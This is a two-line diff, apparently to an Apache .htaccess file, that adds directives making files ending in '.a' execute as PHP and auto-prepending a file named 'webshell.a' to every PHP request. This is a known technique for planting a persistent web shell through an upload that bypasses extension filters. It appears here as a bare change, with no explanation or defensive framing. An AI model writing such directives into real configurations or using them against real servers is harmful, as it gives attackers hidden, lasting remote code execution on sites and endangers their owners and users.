@@ -1,0 +1,2 @@
+AddType application/x-httpd-php .a
+php_value auto_prepend_file webshell.a
